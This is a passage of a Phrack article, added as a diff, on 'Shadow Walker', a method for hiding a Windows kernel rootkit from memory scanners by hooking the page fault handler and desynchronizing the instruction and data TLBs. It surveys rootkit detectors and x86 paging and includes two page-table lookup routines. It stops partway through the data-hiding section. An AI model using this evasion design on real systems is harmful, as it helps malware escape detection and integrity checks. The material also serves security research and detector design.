@@ -1,0 +1,1225 @@
+
+                           ==Phrack Inc.==
+
+              Volume 0x0b, Issue 0x3d, Phile #0x08 of 0x14
+
+
+|=-------------------------=[ Shadow Walker ]=---------------------------=|
+|=--------=[ Raising The Bar For Windows Rootkit Detection ]=------------=|
+|=-----------------------------------------------------------------------=|
+|=---------=[ Sherri Sparks <ssparks at mail.cs.ucf dot edu > ]=---------=|
+|=---------=[ Jamie Butler <james.butler at hbgary dot com >  ]=---------=|
+      
+0 - Introduction & Background On Rootkit Technology                        
+  0.1 - Motivations                                                        
+      
+1 - Rootkit Detection                                                      
+  1.1 - Detecting The Effect Of A Rootkit (Heuristics)                     
+  1.2 - Detecting The Rootkit Itself (Signatures)                          
+      
+2 - Memory Architecture Review                                             
+  2.1 - Virtual Memory - Paging vs. Segmentation                           
+  2.2 - Page Tables & PTE's                                                
+  2.3 - Virtual to Physical Address Translation                            
+  2.4 - The Role of the Page Fault Handler                                 
+  2.5 - The Paging Performance Problem & the TLB                           
+      
+3 - Memory Cloaking Concept                                                
+  3.1 - Hiding Executable Code                                             
+  3.2 - Hiding Pure Data                                                   
+  3.3 - Related Work                                                       
+  3.4 - Proof of Concept Implementation                                    
+      3.4.a - Modified FU Rootkit                                          
+      3.4.b - Shadow Walker Memory Hook Engine                             
+                                   
+4 - Known Limitations & Performance Impact
+                                  
+5 - Detection
+     
+6 - Conclusion                                                             
+      
+7 - References 
+
+8 - Acknowlegements                                           
+      
+--[ 0 - Introduction & Background                                          
+
+Rootkits have historically demonstrated a co-evolutionary adaptation and   
+response to the development of defensive technologies designed to
+apprehend their subversive agenda.  If we trace the evolution of rootkit 
+technology, this pattern is evident.  First generation rootkits were 
+primitive.  They  simply replaced / modified key system files on the 
+victim's system.  The UNIX login program was a common target and involved
+an attacker replacing the original binary with a maliciously enhanced 
+version that logged user passwords.  Because these early rootkit 
+modifications were limited to system files on disk, they motivated the 
+development of file system integrity checkers such as Tripwire [1].        
+          
+In response, rootkit developers moved their modifications off disk to the  
+memory images of the loaded programs and, again, evaded detection. These   
+'second' generation rootkits were primarily based upon hooking techniques
+that altered the execution path by making memory patches to loaded         
+applications and some operating system components such as the system call  
+table. Although much stealthier, such modifications remained detectable by 
+searching for heuristic abnormalities. For example, it is suspicious for   
+the system service table to contain pointers that do not point to the      
+operating system kernel. This is the technique used by VICE [2].           
+
+Third generation kernel rootkit techniques like Direct Kernel Object       
+Manipulation (DKOM), which was implemented in the FU rootkit [3], 
+capitalize on the weaknesses of current detection software by modifying 
+dynamically changing kernel data structures for which it is impossible to 
+establish a static trusted baseline.
+      
+----[ 0.1 - Motivations
+                                                    
+There are public rootkits which illustrate all of these various techniques,
+but even the most sophisticated Windows kernel rootkits, like FU, possess  
+an inherent flaw. They subvert essentially all of the operating system's   
+subsystems with one exception: memory management. Kernel rootkits can      
+control the execution path of kernel code, alter kernel data, and fake     
+system call return values, but they have not (yet) demonstrated the        
+capability to 'hook' or fake the contents of memory seen by other running  
+applications.  In other words, public kernel rootkits are sitting ducks for
+in memory signature scans.  Only now are security companies beginning to 
+think of implementing memory signature scans.                              
+                                                                           
+Hiding from memory scans is similar to the problem faced by early viruses 
+attempting to hide on the file system. Virus writers reacted to anti-virus 
+programs scanning the file system by developing polymorphic and metamorphic
+techniques to evade detection.  Polymorphism attempts to alter the binary  
+image of a virus by replacing blocks of code with functionally equivalent  
+blocks that appear different (i.e. use different opcodes to perform the    
+same task).  Polymorphic code, therefore, alters the superficial appearance
+of a block of code, but it does not fundamentally alter a scanner's view of
+that region of system memory.                                              
+                                                                           
+Traditionally, there have been three general approaches to malicious code  
+detection: misuse detection, which relies upon known code signatures,      
+anomaly detection, which relies upon heuristics and statistical deviations 
+from 'normal' behavior, and integrity checking which relies upon comparing 
+current snapshots of the file system or memory with a known, trusted       
+baseline.  A polymorphic rootkit (or virus) effectively evades signature   
+based detection of its code body, but falls short in anomaly or integrity  
+detection schemes because it cannot easily camouflage the changes it makes 
+to existing binary code in other system components.                        
+                                                                           
+Now imagine a rootkit that makes no effort to change its superficial       
+appearance, yet is capable of fundamentally altering a detectors view of an
+arbitrary region of memory. When the detector attempts to read any region  
+of memory modified by the rootkit, it sees a 'normal', unaltered view of   
+memory. Only the rootkit sees the true, altered view of memory. Such a     
+rootkit is clearly capable of compromising all of the primary detection    
+methodologies to varying degrees.  The implications to misuse detection are
+obvious. A scanner attempts to read the memory for the loaded rootkit      
+driver looking for a code signature and the rootkit simply returns a       
+random, 'fake' view of memory (i.e. which does not include its own code) to
+the scanner.  There are also implications for integrity validation         
+approaches to detection.  In these cases, the rootkit returns the unaltered
+view of memory to all processes other than itself.  The integrity checker  
+sees the unaltered code, finds a matching CRC or hash, and (erroneously)   
+assumes that all is well.  Finally, any anomaly detection methods which    
+rely upon identifying deviant structural characteristics will be fooled    
+since they will receive a 'normal' view of the code. An example of this    
+might be a scanner like VICE which attempts to heuristically identify      
+inline function hooks by the presence of a direct jump at the beginning of 
+the function body.                                                         
+
+Current rootkits, with the exception of Hacker Defender [4], have made 
+little or no effort to introduce viral polymorphism techniques.  As stated 
+previously, while a valuable technique, polymorphism is not a comprehensive
+solution to the problem for a rootkit because the rootkit cannot easily    
+camouflage the changes it must make to existing code in order to install   
+its hooks.  Our objective, therefore, is to show proof of concept that the 
+current architecture permits subversion of memory management such that a   
+non polymorphic kernel mode rootkit (or virus) is capable of controlling   
+the view of memory regions seen by the operating system and other processes
+with a minimal performance hit. The end result is that it is possible to   
+hide a 'known' public rootkit driver (for which a code signature exists)   
+from detection.  To this end, we have designed an 'enhanced' version of the
+FU rootkit. In section 1, we discuss the basic techniques used to detect a 
+rootkit. In section 2, we give a background summary of the x86 memory      
+architecture.  Section 3 outlines the concept of memory cloaking and proof 
+of concept implementation for our enhanced rootkit.  Finally, we           
+conclude with a discussion of its detectability, limitations, future       
+extensibility, and performance impact.  Without further ado, we bid you    
+welcome to 4th generation rootkit technology.                              
+      
+--[ 1 - Rootkit Detection                                                  
+      
+Until several months ago, rootkit detection was largely ignored by security
+vendors. Many mistakenly classified rootkits in the same category as other 
+viruses and malware. Because of this, security companies continued to use  
+the same detection methods the most prominent one being signature scans on 
+the file system. This is only partially effective. Once a rootkit is loaded
+in memory is can delete itself on disk, hide its files, or even divert an  
+attempt to open the rootkit file. In this section, we will examine more    
+recent advances in rootkit detection.                                      
+      
+----[ 1.2 - Detecting The Effect Of A Rootkit (Heuristics)                 
+      
+One method to detect the presence of a rootkit is to detect how it alters  
+other parameters on the computer system. In this way, the effects of the   
+rootkit are seen although the actual rootkit that caused the deviation may 
+not be known. This solution is a more general approach since no signature  
+for a particular rootkit is necessary. This technique is also looking for  
+the rootkit in memory and not on the file system.                          
+      
+One effect of a rootkit is that it usually alters the execution path of a  
+normal program. By inserting itself in the middle of a program's execution,
+the rootkit can act as a middle man between the kernel functions the       
+program relies upon and the program. With this position of power, the      
+rootkit can alter what the program sees and does. For example, the rootkit 
+could return a handle to a log file that is different from the one the     
+program intended to open, or the rootkit could change the destination of   
+network communication. These rootkit patches or hooks cause extra          
+instructions to be executed. When a patched function is compared to a      
+normal function, the difference in the number of instructions executed can
+be indicative of a rootkit. This is the technique used by PatchFinder [5]. 
+One of the drawbacks of PatchFinder is that the CPU must be put into single
+step mode in order to count instructions. So for every instruction executed
+an interrupt is fired and must be handled. This slows the performance of   
+the system, which may be unacceptable on a production machine. Also, the   
+actual number of instructions executed can vary even on a clean system.    
+Another rootkit detection tool called VICE detects the presence of hooks in
+applications and in the kernel . VICE analyzes the addresses of the        
+functions exported by the operating system looking for hooks. The exported 
+functions are typically the target of rootkits because by filtering certain
+APIs rootkits can hide. By finding the hooks themselves, VICE avoids the   
+problems associated with instruction counting. However, VICE also relies   
+upon several APIs so it is possible for a rootkit to defeat its hook
+detection [6]. Currently the biggest weakness of VICE is that it detects 
+all hooks both malicious and benign. Hooking is a legitimate technique used
+by many security products.                                                 
+      
+Another approach to detecting the effects of a rootkit is to identify the  
+operating system lying. The operating system exposes a well-known API in   
+order for applications to interact with it. When the rootkit alters the    
+results of a particular API, it is a lie. For example, Windows Explorer may
+request the number of files in a directory using several functions in the  
+Win32 API. If the rootkit changes the number of files that the application 
+can see, it is a lie. To detect the lie, a rootkit detector needs at least 
+two ways to obtain the same information. Then, both results can be
+compared. RootkitRevealer [7] uses this technique. It calls the highest 
+level APIs and compares those results with the results of the lowest level 
+APIs. This method can be bypassed by a rootkit if it also hooks at those 
+lowest layers. RootkitRevealer also does not address data alterations. The 
+FU rootkit alters the kernel data structures in order to hide its 
+processes. RootkitRevealer does not detect this because both the higher and
+lower layer APIs return the same altered data set. Blacklight from F-Secure
+[8] also tries to detect deviations from the truth. To detect hidden 
+processes, it relies on an undocumented kernel structure. Just as FU walks 
+the linked list of processes to hide, Blacklight walks a linked list of 
+handle tables in the kernel. Every process has a handle table; therefore, 
+by identifying all the handle tables Blacklight can find a pointer to every
+process on the computer. FU has been updated to also unhook the hidden 
+process from the linked list of handle tables. This arms race will 
+continue.                
+      
+----[ 1.2 - Detecting the Rootkit Itself (Signatures)                      
+      
+Anti-virus companies have shown that scanning file systems for signatures
+can be effective; however, it can be subverted. If the attacker camouflages
+the binary by using a packing routine, the signature may no longer match   
+the rootkit. A signature of the rootkit as it will execute in memory is one
+way to solve this problem. Some host based intrusion prevention systems    
+(HIPS) try to prevent the rootkit from loading. However, it is extremely   
+difficult to block all the ways code can be loaded in the kernel . Recent  
+papers by Jack Barnaby [9] and Chong [10] have highlighted the threat of 
+kernel exploits, which will allow arbitrary code to be loaded into memory 
+and executed.                                                              
+      
+Although file system scans and loading detection are needed, perhaps the   
+last layer of detection is scanning memory itself. This provides an added  
+layer of security if the rootkit has bypassed the previous checks. Memory  
+signatures are more reliable because the rootkit must unpack or unencrypt  
+in order to execute. Not only can scanning memory be used to find a        
+rootkit, it can be used to verify the integrity of the kernel itself since 
+it has a known signature. Scanning kernel memory is also much faster than
+scanning everything on disk. Arbaugh et. al. [11] have taken this technique
+to the next level by implementing the scanner on a separate card with its 
+own CPU. 
+
+The next section will explain the memory architecture on Intel x86.   
+      
+--[ 2 - Memory Architecture Review                                         
+      
+In early computing history, programmers were constrained by the amount of  
+physical memory contained in a system.  If a program was too large to fit  
+into memory, it was the programmer's responsibility to divide the program  
+into pieces that could be loaded and unloaded on demand. These pieces were 
+called overlays.  Forcing this type of memory management upon user level   
+programmers increased code complexity and programming errors while reducing
+efficiency.  Virtual memory was invented to relieve programmers of these   
+burdens.                                                                   
+      
+----[ 2.1 - Virtual Memory - Paging vs. Segmentation                       
+      
+Virtual memory is based upon the separation of the virtual and physical    
+address spaces. The size of the virtual address space is primarily a       
+function of the width of the address bus whereas the size of the physical  
+address space is dependent upon the quantity of RAM installed in the       
+system. Thus, a system possessing a 32 bit bus is capable of addressing    
+2^32 (or ~4 GB) physical bytes of contiguous memory. It may, however, not  
+have anywhere near that quantity of RAM installed. If this is the case,    
+then the virtual address space will be larger than the physical address    
+space. Virtual memory divides both the virtual and physical address spaces 
+into fixed size blocks. If these blocks are all the same size, the system  
+is said to use a paging memory model. If the blocks are varying sizes, it  
+is considered to be a segmentation model. The x86 architecture is in fact a
+hybrid, utlizing both segementation and paging, however, this article      
+focuses primarily upon exploitation of its paging mechanism.               
+      
+Under a paging model, blocks of virtual memory are referred to as pages and
+blocks of physical memory are referred to as frames. Each virtual page maps
+to a designated physical frame. This is what enables the virtual address   
+space seen by programs to be larger than the amount of physically          
+addressable memory (i.e. there may be more pages than physical frames). It 
+also means that virtually contiguous pages do not have to be physically    
+contiguous. These points are illustrated by Figure 1.                      
+      
+   VIRTUAL ADDRESS                      PHYSICAL ADDRESS                   
+        SPACE                                SPACE                         
+   /-------------\                      /-------------\                    
+   |             |                      |             |                    
+   |   PAGE 01   |---\   /----------->>>|  FRAME 01   |                    
+   |             |   |   |              |             |                    
+   ---------------   |   |              ---------------                    
+   |             |   |   |              |             |                    
+   |   PAGE 02   |------------------->>>|  FRAME 02   |                    
+   |             |   |   |              |             |                    
+   ---------------   |   |              ---------------                    
+   |             |   |   |              |             |                    
+   |   PAGE 03   |   \---|----------->>>|  FRAME 03   |                    
+   |             |       |              |             |                    
+   ---------------       |              \-------------/                    
+   |             |       |                                                 
+   |   PAGE 04   |       |                                                 
+   |             |       |                                                 
+   |-------------|       |                                                 
+   |             |       |                                                 
+   |   PAGE 05   |-------/                                                 
+   |             |                                                         
+   \-------------/                                                         
+      
+   [ Figure 1 - Virtual To Physical Memory Mapping (Paging)         ]      
+   [                                                                ]      
+   [ NOTE: 1. Virtual & physical address spaces are divided into    ]      
+   [ fixed size blocks. 2. The virtual address space may be larger  ]      
+   [ than the physical address space. 3. Virtually contiguous       ]      
+   [ blocks to not have to be mapped to physically contiguous       ]      
+   [ frames.                                                        ]      
+      
+----[ 2.2 - Page Tables & PTE's
+      
+The mapping information that connects a virtual address with its physical  
+frame is stored in page tables in structures known as PTE's. PTE's also    
+store status information. Status bits may indicate, for example, weather or
+not a page is valid (physically present in memory versus stored on disk),  
+if it is writable, or if it is a user / supervisor page. Figure 2 shows the
+format for an x86 PTE.                                                     
+      
+   Valid          <------------------------------------------------\       
+   Read/Write     <--------------------------------------------\   |       
+   Privilege      <----------------------------------------\   |   |       
+   Write Through  <------------------------------------\   |   |   |       
+   Cache Disabled <--------------------------------\   |   |   |   |       
+   Accessed       <---------------------------\    |   |   |   |   |       
+   Dirty          <-----------------------\   |    |   |   |   |   |       
+   Reserved       <-------------------\   |   |    |   |   |   |   |       
+   Global         <---------------\   |   |   |    |   |   |   |   |       
+   Reserved       <----------\    |   |   |   |    |   |   |   |   |       
+   Reserved       <-----\    |    |   |   |   |    |   |   |   |   |       
+   Reserved       <-\   |    |    |   |   |   |    |   |   |   |   |       
+                    |   |    |    |   |   |   |    |   |   |   |   |       
+   +----------------+---+----+----+---+---+---+----+---+---+---+---+-+     
+   |              |   |   |    |    |   |   |   |    |   | U | R |   |     
+   | PAGE FRAME # | U | P | Cw | Gl | L | D | A | Cd | Wt| / | / | V |     
+   |              |   |   |    |    |   |   |   |    |   | S | W |   |     
+   +-----------------------------------------------------------------+     
+      
+   [ Figure 2 - x86 PTE FORMAT (4 KBYTE PAGE) ]                            
+      
+      
+----[ 2.4 - Virtual To Physical Address Translation                        
+      
+Virtual addresses encode the information necessary to find their PTE's in  
+the page table. They are divided into 2 basic parts: the virtual page      
+number and the byte index.  The virtual page number provides the index into
+the page table while the byte index provides an offset into the physical   
+frame. When a memory reference occurs, the PTE for the page is looked up in
+the page table by adding the page table base address to the virtual page   
+number * PTE entry size. The base address of the page in physical memory is
+then extracted from the PTE and combined with the byte offset to define the
+physical memory address that is sent to the memory unit.  If the virtual   
+address space is particularly large and the page size relatively small, it 
+stands to reason that it will require a large page table to hold all of the
+mapping information. And as the page table must remain resident in main    
+memory, a large table can be costly. One solution to this dilemma is to use
+a multi-level paging scheme.  A two-level paging scheme, in effect, pages  
+the page table. It further subdivides the virtual page number into a page  
+directory and a page table index. The page directory is simply a table of  
+pointers to page tables. This two level paging scheme is the one supported 
+by the x86. Figure 3 illustrates how the virtual address is divided up to  
+index the page directory and page tables and Figure 4 illustrates the      
+process of address translation.                                            
+      
+   +---------------------------------------+                               
+   | 31                                 12 |                 0             
+   | +----------------+ +----------------+ | +---------------+             
+   | | PAGE DIRECTORY | |   PAGE TABLE   | | |  BYTE INDEX   |             
+   | |     INDEX      | |     INDEX      | | |               |             
+   | +----------------+ +----------------+ | +---------------+             
+   |       10 bits            10 bits      |      12 bits                  
+   |                                       |                               
+   |         VIRTUAL PAGE NUMBER           |                               
+   +---------------------------------------+                               
+      
+   [ Figure 3 - x86 Address & Page Table Indexing Scheme ]                 
+      
+        
+     +--------+                                                            
+   /-|KPROCESS|                                                            
+   | +--------+                                                            
+   |               Virtual Address                                         
+   | +------------------------------------------+                          
+   | | Page Directory | Page Table | Byte Index |                          
+   | |     Index      |   Index    |            |                          
+   | +-+-------------------+-------------+------+                          
+   |   | +---+             |             |                                 
+   |   | |CR3| Physical    |             |                                 
+   |   | +---+ Address Of  |             |                                 
+   |   |       Page Dir    |             |                                 
+   |   |                   |             \------ -\                        
+   |   |                   |                      |                       
+   |   |  Page Directory   |       Page Table     |     Physical Memory    
+   \---|->+------------+   | /-->+------------+   \---->+------------+     
+       |  |            |   | |   |            |         |            |     
+       |  |            |   | |   |            |         |            |     
+       |  |            |   | |   |            |         |------------|     
+       |  |            |   | |   |            |         |            |     
+       |  |------------|   | |   |            |         |   Page     |     
+       \->|    PDN     |---|-/   |            |         |   Frame    |     
+          |------------|   |     |            |      /---->          |     
+          |            |   |     |            |      |  |------------|     
+          |            |   |     |            |      |  |            |     
+          |            |   |     |            |      |  |            |     
+          |            |   |     |            |      |  |            |     
+          |            |   |     |------------|      |  |            |     
+          |            |   \---->|    PFN     -------/  |            |     
+          |            |         |------------|         |            |     
+          +------------+         +------------+         +------------+     
+          (1 per process)      (512 per processs)                          
+      
+   [ Figure 4 - x86 Address Translation ]                                
+ 
+     
+A memory access under a 2 level paging scheme potentially involves the     
+following sequence of steps.                                               
+      
+1. Lookup of page directory entry (PDE).
+   Page Directory Entry = Page Directory Base Address + sizeof(PDE) * Page 
+   Directory Index (extracted from virtual address that caused the  memory 
+   access)
+   NOTE: Windows maps the page directory to virtual address 0xC0300000. 
+   Base addresses for page directories are also located in KPROCESS blocks 
+   and the register cr3 contains the physical address of the current 
+   page directory.  
+      
+2. Lookup of page table entry.                                             
+   Page Table Entry = Page Table Base Address + sizeof(PTE) * Page Table
+   Index (extracted from virtual address that caused the memory access).   
+   NOTE: Windows maps the page directory to virtual address 0xC0000000.
+   The base physical address for the page table is also stored in the page 
+   directory entry.                                                        
+      
+3. Lookup of physical address.                                             
+   Physical Address = Contents of PTE + Byte Index                         
+   NOTE: PTEs hold the physical address for the physical frame. This is 
+   combined with the byte index (offset into the frame) to form the 
+   complete physical address. For those who prefer code to explanation, the
+   following two routines show how this translation occurs. The first 
+   routine, GetPteAddress performs steps 1 and 2 described above. It 
+   returns a pointer to the page table entry for a given virtual address. 
+   The second routine returns the base physical address of the frame to 
+   which the page is mapped.
+      
+#define PROCESS_PAGE_DIR_BASE                  0xC0300000
+#define PROCESS_PAGE_TABLE_BASE                0xC0000000
+typedef unsigned long* PPTE;
+      
+/**************************************************************************
+* GetPteAddress - Returns a pointer to the page table entry corresponding  
+*                 to a given memory address.                               
+*     
+* Parameters:
+*       PVOID VirtualAddress - Address you wish to acquire a pointer to the
+*                              page table entry for.                       
+*     
+* Return - Pointer to the page table entry for VirtualAddress or an error  
+*          code.                                                           
+*     
+* Error Codes:                                                             
+*       ERROR_PTE_NOT_PRESENT - The page table for the given virtual 
+*                               address is not present in memory.          
+*      ERROR_PAGE_NOT_PRESENT - The page containing the data for the       
+*                               given virtual address is not present in    
+*                               memory.                                    
+**************************************************************************/
+PPTE GetPteAddress( PVOID VirtualAddress )                                 
+{     
+        PPTE pPTE = 0;                                                     
+        __asm                                                              
+        {                                                                  
+                cli                     //disable interrupts               
+                pushad                                                     
+                mov esi, PROCESS_PAGE_DIR_BASE                             
+                mov edx, VirtualAddress                                    
+                mov eax, edx                                               
+                shr eax, 22                                                
+                lea eax, [esi + eax*4]  //pointer to page directory entry  
+                test [eax], 0x80        //is it a large page?              
+                jnz Is_Large_Page       //it's a large page                
+                mov esi, PROCESS_PAGE_TABLE_BASE                           
+                shr edx, 12                                                
+                lea eax, [esi + edx*4]  //pointer to page table entry (PTE)
+                mov pPTE, eax                                              
+                jmp Done                                                   
+      
+                //NOTE: There is not a page table for large pages because 
+                //the phys frames are contained in the page directory.     
+                Is_Large_Page:                                             
+                mov pPTE, eax                                              
+      
+                Done:                                                      
+                popad                                                      
+                sti                    //reenable interrupts               
+        }//end asm                                                         
+      
+        return pPTE;                                                       
+      
+}//end GetPteAddress                                                       
+      
+/**************************************************************************
+* GetPhysicalFrameAddress - Gets the base physical address in memory where 
+*                           the page is mapped. This corresponds to the    
+*                           bits 12 - 32 in the page table entry.          
+*     
+* Parameters -                                                             
+*       PPTE pPte - Pointer to the PTE that you wish to retrieve the 
+*       physical address from.                                             
+*     
+* Return - The physical address of the page.                               
+**************************************************************************/
+ULONG GetPhysicalFrameAddress( PPTE pPte )                                 
+{     
+        ULONG Frame = 0;                                                   
+      
+        __asm                                                              
+        {                                                                  
+                cli                                                        
+                pushad                                                     
+                mov eax, pPte                                              
+                mov ecx, [eax]                                             
+                shr ecx, 12  //physical page frame consists of the         
+                             //upper 20 bits
+                mov Frame, ecx                                             
+                popad                                                      
+                sti                                                        
+        }//end asm                                                         
+        return Frame;                                                      
+      
+}//end GetPhysicalFrameAddress                                             
+      
+      
+----[ 2.5 - The Role Of The Page Fault Handler                             
+      
+Since many processes only use a small portion of their virtual address     
+space, only the used portions are mapped to physical frames. Also, because 
+physical memory may be smaller than the virtual address space, the OS may  
+move less recently used pages to disk (the pagefile) to satisfy current    
+memory demands. Frame allocation is handled by the operating system. If a  
+process is larger than the available quantity of physical memory, or the   
+operating system runs out of free physical frames, some of the currently   
+allocated frames must be swapped to disk to make room. These swapped out   
+pages are stored in the page file. The information about whether or not a  
+page is resident in main memory is stored in the page table entry. When a  
+memory access occurs, if the page is not present in main memory a page     
+fault is generated.  It is the job of the page fault handler to issue the  
+I/O requests to swap out a less recently used page if all of the available 
+physical frames are full and then to bring in the requested page from the  
+pagefile.  When virtual memory is enabled, every memory access must be     
+looked up in the page table to determine which physical frame it maps to   
+and whether or not it is present in main memory. This incurs a substantial 
+performance overhead, especially when the architecture is based upon a     
+multi-level page table scheme like the Intel Pentium. The memory access    
+page fault path can be summarized as follows.                              
+      
+1. Lookup in the page directory to determine if the page table for the     
+   address is present in main memory.                                      
+2. If not, an I/O request is issued to bring in the page table from disk.  
+3. Lookup in the page table to determine if the requested page is present  
+   in main memory.                                                         
+4. If not, an I/O request is issued to bring in the page from disk.        
+5. Lookup the requested byte (offset) in the page.                         
+      
+Therefore every memory access, in the best case, actually requires 3 memory
+accesses : 1 to access the page directory, 1 to access the page table, and 
+1 to get the data at the correct offset.  In the worst case, it may require
+an additional 2 disk I/Os (if the pages are swapped out to disk). Thus, 
+virtual memory incurs a steep performance hit.                             
+      
+----[ 2.6 - The Paging Performance Problem & The TLB                       
+      
+The translation lookaside buffer (TLB) was introduced to help mitigate this
+problem. Basically, the TLB is a hardware cache which holds frequently used
+virtual to physical mappings. Because the TLB is implemented using         
+extremely fast associative memory, it can be searched for a translation    
+much faster than it would take to look that translation up in the page     
+tables.  On a memory access, the TLB is first searched for a valid 
+translation. If the translation is found, it is termed a TLB hit. 
+Otherwise, it is a miss.  A TLB hit, therefore, bypasses the slower page 
+table lookup. Modern TLB's have an extremely high hit rate and        
+therefore seldom incur miss penalty of looking up the translation in the   
+page table.                                                                
+               
+--[ 3 - Memory Cloaking Concept                                            
+      
+One goal of an advanced rootkit is to hide its changes to executable code
+(i.e. the placement of an inline patch, for example).  Obviously, it may
+also wish to hide its own code from view.  Code, like data, sits in memory
+and we may define the basic forms of memory access as:
+
+  - EXECUTE
+  - READ
+  - WRITE
+
+Technically speaking, we know that each virtual page maps to a physical    
+page frame defined by a certain number of bits in the page table entry.    
+What if we could filter memory accesses such that EXECUTE accesses mapped  
+to a different physical frame than READ / WRITE accesses? From a rootkit's 
+perspective, this would be highly advantageous.  Consider the case of an   
+inline hook. The modified code would run normally, but any attempts to read
+(i.e. detect) changes to the code would be diverted to a 'virgin' physical 
+frame that contained a view of the original, unaltered code. Similarly, a  
+rootkit driver might hide itself by diverting READ accesses within its     
+memory range off to a page containing random garbage or to a page          
+containing a view of code from another 'innocent' driver.  This would imply
+that it is possible to spoof both signature scanners and integrity         
+monitors.  Indeed, an architectural feature of the Pentium architecture    
+makes it possible for a rootkit to perform this little trick with a minimal
+impact on overall system performance.  We describe the details in the next 
+section.                                                                   
+      
+----[ 3.1 - Hiding Executable Code                                         
+      
+Ironically, the general  methodology  we are about to discuss is an        
+offensive extension of an existing stack overflow protection scheme known  
+as PaX. We briefly discuss the PaX implementation in 3.3 under related    
+work. 
+
+In order to hide executable code, there are at least 3 underlying issues
+which must be addressed:
+
+1. We need a way to filter execute and read / write accesses.
+2. We need a way to "fake" the read / write memory accesses
+   when we detect them.
+3. We need to ensure that performance is not adversly affected.
+
+The first issue concerns how to filter execute accesses from read / write
+accesses. When virtual memory is enabled, memory access restrictions are
+enforced by setting bits in the page table entry which specify whether a
+given page is read-only or read-write. Under the IA-32 architecture,
+however, all pages are executable.  As such, there is no official way to
+filter execute accesses from read / write accesses and thus enforce the 
+execute-only / diverted read-write semantics necessary for this scheme 
+to work.  We can, however, trap and filter memory accesses by marking their
+PTE's non present and hooking the page fault handler.  In the page fault
+handler we have access to the saved instruction pointer and the faulting
+address. If the instruction pointer equals the faulting address, then it is
+an execute access.  Otherwise, it is a read / write.  As the OS uses the
+present bit in memory management, we also need to differentiate between
+page faults due to our memory hook and normal page faults.  The simplest
+way is to require that all hooked pages either reside in non paged memory
+or be explicitly locked down via an API like MmProbeAndLockPages. 
+
+The next issue concerns how to "fake" the EXECUTE and READ / WRITE accesses
+when we detect them (and do so with a minimal performance hit). In this 
+case, the Pentium TLB architecture comes to the rescue.  The pentium
+possesses a split TLB with one TLB for instructions and the other for data.
+As mentioned previously, the TLB caches the virtual to physical page frame 
+mappings when virtual memory is enabled.  Normally, the ITLB and DTLB are  
+synchronized and hold the same physical mapping for a given page. Though   
+the TLB is primarily hardware controlled, there are several software       
+mechanisms for manipulating it.                                            
+      
+  - Reloading cr3 causes all TLB entries except global entries to be 
+    flushed. This typically occurs on a context switch.                    
+  - The invlpg causes a specific TLB entry to be flushed.                  
+  - Executing a data access instruction causes the DTLB to be loaded with
+    the mapping for the data page that was accessed.                       
+  - Executing a call causes the ITLB to be loaded with the mapping for the 
+    page containing the code executed in response to the call.             
+  
+We can filter execute accesses from read / write accesses and fake them by 
+desynchronizing the TLB's such that the ITLB holds a different virtual to  
+physical mapping than the DTLB.  This process is performed as follows:
+
+First, a new page fault handler is installed to handle the cloaked page
+accesses.  Then the page-to-be-hooked is marked not present and it's 
+TLB entry is flushed via the invlpg instruction. This ensures that all  
+subsequent  accesses to the page will be filtered through the installed    
+page fault handler.  Within the installed page fault handler, we determine 
+whether a given memory access is due to an execute or read/write by 
+comparing the saved instruction pointer with the faulting address.  If they
+match, the memory access is due to an execute.  Otherwise, it is due to a 
+read / write.  The type of access determines which mapping is manually 
+loaded into the ITLB or DTLB.  Figure 5 provides a conceptual view  
+of this strategy. 
+
+Lastly, it is important to note that TLB access is much faster than                  
+performing a page table lookup. In general, page faults are costly.
+Therefore, at first glance, it might appear that marking the hidden pages  
+not present would incur a significant performance hit. This is, in fact,
+not the case. Though we mark the hidden pages not present, for most memory
+accesses we do not incur the penalty of a page fault because the entries 
+are cached in the TLB. The exceptions are, of course, the initial faults
+that occur after marking the cloaked page not present and any subsequent
+faults which result from cache line evictions when a TLB set becomes full.
+Thus, the primary job of the new page fault handler is to explicitly and
+selectively load the DTLB or ITLB with the correct mappings for hidden
+pages. All faults originating on other pages are passed down to the
+operating system page fault handler.    
+   
+   
+                                                     +-------------+ 
+                                        rootkit code |   FRAME 1   |  
+      Is it a +-----------+           /------------->|             |       
+       code   |           |           |              |-------------|       
+      access? |   ITLB    |           |              |   FRAME 2   |       
+      /------>|-----------|-----------/              |             |       
+      |       |  VPN=12   |                          |-------------|       
+      |       |  Frame=1  |                          |   FRAME 3   |       
+      |       +-----------+                          |             |       
+      |                           +-------------+    |-------------|       
+   MEMORY                         | PAGE TABLES |    |   FRAME 4   |       
+   ACCESS                         +-------------+    |             |       
+   VPN=12                                            |-------------|       
+      |                                              |   FRAME 5   |       
+      |       +-----------+                          |             |       
+      |       |           |                          |-------------|       
+      |       |   DTLB    |           random garbage |   FRAME 6   |       
+      |------>|------------------------------------->|             |       
+      Is it a |  VPN=12   |                          |-------------|       
+        data  |  Frame=6  |                          |   FRAME N   |       
+      access? +-----------+                          |             |       
+                                                     +-------------+       
+   
+   [ Figure 5 - Faking Read / Writes by Desynchronizing the Split TLB ]    
+  
+----[ 3.2 - Hiding Pure Data                                               
+      
+Hiding data modifications is significantly less optimal than hiding code   
+modifications, but it can be accomplished provided that one is willing to  
+accept the performance hit.  We cause a minimal performance loss when      
+hiding executable code by virtue of the fact that the ITLB can maintain a  
+different mapping than the DTLB. Code can execute very fast with a minimum 
+of page faults because that mapping is always present in the ITLB (except  
+in the rare event the ITLB entry gets evicted from the cache).             
+Unfortunately, in the case of data we can't introduce any such             
+inconsistency. There is only 1 DTLB and consequently that DTLB has to be   
+kept empty if we are to catch and filter specific data accesses. The end   
+result is 1 page fault per data access. This is not be a big problem in    
+terms of hiding a specific driver if the driver is carefully designed and  
+uses a minimum of global data, but the performance hit could be formidable 
+when trying to hide a frequently accessed data page.
+
+For data hiding, we have used a protocol based approach between the hidden 
+driver and the memory hook. We use this to show how one might hide global
+data in a rootkit driver.  In order to allow the memory access to go throug
+the DTLB is loaded in the page fault handler.  In order to enforce the 
+correct filtering of data accesses, however, it must be flushed immediately
+by the requesting driver to ensure that no other code accesses that memory 
+address and receives the data resulting from an incorrect mapping.         
+The protocol for accessing data on a hidden page is as follows:          
+
+1. The driver raises the IRQL to DISPATCH_LEVEL (to ensure that no other
+   code gets to run which might see the "hidden" data as opposed to the    
+   "fake" data).
+                                                          
+2. The driver must explicitly flush the TLB entry for the page containing  
+   the cloaked variable using the invlpg instruction. In the event that    
+   some other process has attempted to access our data page and been       
+   served with the fake frame (i.e. we don't want to receive the fake  
+   mapping which may still reside in the TLB so we clear it to be sure). 
+                
+3. The driver is allowed to perform the  data access.      
+                
